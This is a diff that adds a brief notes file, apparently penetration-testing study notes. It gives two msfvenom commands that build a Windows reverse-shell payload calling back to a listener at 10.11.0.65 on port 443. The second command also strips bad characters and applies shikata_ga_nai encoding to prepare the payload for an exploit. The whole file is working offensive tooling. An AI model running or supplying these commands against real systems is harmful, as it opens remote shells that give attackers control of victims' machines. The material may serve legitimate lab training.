@@ -1,0 +1,8 @@
+generating a reverse shell payload for the windows platform:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.65 LPORT=443 -f c -a x86 --platform windows
+
+encoding the payload to ignore bad characters:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.65 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
